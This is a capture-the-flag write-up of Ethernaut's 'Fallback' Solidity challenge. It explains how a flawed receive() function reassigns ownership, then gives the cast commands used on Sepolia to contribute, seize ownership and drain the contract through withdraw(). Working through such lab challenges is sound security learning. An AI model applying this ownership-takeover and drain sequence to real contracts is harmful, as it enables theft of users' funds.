# Ethernaut Challenge 01 — Fallback


## 🎯 Goal

The challenge is solved when:

```
1. you claim ownership of the contract
2. you reduce its balance to 0
```

In practice, this means:

- becoming the `owner`
- calling `withdraw()` successfully
- draining all ETH from the contract


## 🧠 Thought process

The first thing I noticed is that `contribute()` updates the `contributions` mapping and has a condition that could theoretically reassign ownership:

```solidity
if (contributions[msg.sender] > contributions[owner]) {
    owner = msg.sender;
}
```

But the original owner starts with:

```solidity
contributions[msg.sender] = 1000 * (1 ether);
```

So overtaking the owner through `contribute()` is effectively impossible, because every contribution must satisfy:

```solidity
require(msg.value < 0.001 ether);
```

That pushed me to inspect the rest of the contract for another path to ownership.

The critical observation is the `receive()` function:

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

This creates a much easier attack path:

1. first call `contribute()` with a small amount of ETH  
2. this makes `contributions[msg.sender] > 0` true  
3. then send ETH directly to the contract with empty calldata  
4. this triggers `receive()`  
5. `owner` is reassigned to my address  

Once I become the owner, I can call `withdraw()` and drain the contract.

---

## 🧪 Step 1 — Inspect the contract onchain

Instance address:

```
0x7362C5A8A4449Fedd2103ca8CFa641CBf061a23E
```

First, I loaded the Sepolia RPC URL:

```bash
source .env
```

Then I checked the current owner:

```bash
cast call 0x7362C5A8A4449Fedd2103ca8CFa641CBf061a23E \
    "owner()" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```text
0x0000000000000000000000003c34a342b2af5e885fcaa3800db5b205fefa3ffb
```

At this point, I confirmed that I was not the owner.

---

## 🔓 Step 2 — Become a contributor

To satisfy this condition in `receive()`:

```solidity
contributions[msg.sender] > 0
```

I first called `contribute()` with a small amount of ETH:

```bash
cast send 0x7362C5A8A4449Fedd2103ca8CFa641CBf061a23E \
    "contribute()" \
    --value 0.0001ether \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

Transaction hash:

```text
0xa4c558107e8ef5c11c512f45181cceb8ee34d190062bb2a7b94ad6c7835e5a29
```

To verify that the contract received the ETH, I checked its balance:

```bash
cast balance 0x7362C5A8A4449Fedd2103ca8CFa641CBf061a23E \
    --rpc-url $SEPOLIA_RPC_URL \
    --ether
```

Result:

```text
0.000100000000000000
```

Now my address had a non-zero entry in the `contributions` mapping, which meant I could exploit `receive()`.

---

## 🚀 Step 3 — Trigger `receive()` and take ownership

In Solidity, `receive()` is triggered when:

1. ETH is sent to the contract  
2. calldata is empty  

So instead of calling a function by name, I sent ETH directly to the contract:

```bash
cast send 0x7362C5A8A4449Fedd2103ca8CFa641CBf061a23E \
    --value 0.0000001ether \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

Transaction hash:

```text
0x35ee40b80389cf2fe0941ccc413695b4259e2ad789d46c2004b394bf7c85ab68
```

Because I had already contributed before, this transaction satisfied:

```solidity
require(msg.value > 0 && contributions[msg.sender] > 0);
```

and the contract executed:

```solidity
owner = msg.sender;
```

To verify that ownership had changed, I called `owner()` again:

```bash
cast call 0x7362C5A8A4449Fedd2103ca8CFa641CBf061a23E \
    "owner()" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```text
0x000000000000000000000000ecf94300dd67bb8c31f41be3a2136d3f0abfb0b0
```

This is my wallet address, so the ownership takeover succeeded.

---

## 💸 Step 4 — Withdraw all ETH

Once I became the owner, I could call `withdraw()`:

```bash
cast send 0x7362C5A8A4449Fedd2103ca8CFa641CBf061a23E \
    "withdraw()" \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

Transaction hash:

```text
0x25ad9cb79672594dc4cf00c4a18018f65d2abd233f7ad5748520c25da11fc598
```

Then I checked the contract balance again:

```bash
cast balance 0x7362C5A8A4449Fedd2103ca8CFa641CBf061a23E \
    --rpc-url $SEPOLIA_RPC_URL \
    --ether
```

Result:

```text
0.000000000000000000
```

The contract balance was now zero, so the challenge was solved.

---

## 📜 My transactions

Contribution:

```text
0xa4c558107e8ef5c11c512f45181cceb8ee34d190062bb2a7b94ad6c7835e5a29
```

Ownership takeover through `receive()`:

```text
0x35ee40b80389cf2fe0941ccc413695b4259e2ad789d46c2004b394bf7c85ab68
```

Withdraw:

```text
0x25ad9cb79672594dc4cf00c4a18018f65d2abd233f7ad5748520c25da11fc598
```

---
